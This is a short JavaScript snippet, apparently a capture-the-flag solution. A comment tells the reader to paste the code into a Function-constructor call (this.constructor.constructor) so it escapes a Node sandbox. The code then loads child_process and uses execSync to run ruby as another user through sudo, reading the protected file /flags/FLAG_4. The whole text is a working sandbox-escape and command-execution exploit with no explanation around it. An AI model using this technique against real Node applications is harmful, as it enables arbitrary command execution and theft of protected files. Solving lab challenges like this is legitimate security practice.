/*  Paste the following code inside of the backticks (`)
this.constructor.constructor(`
    // HERE
`)()
*/

const exec = process.mainModule.require('child_process').execSync;
return exec(\`sudo -u super_k1dd13 ruby -c "open('/flags/FLAG_4').read()"\`);
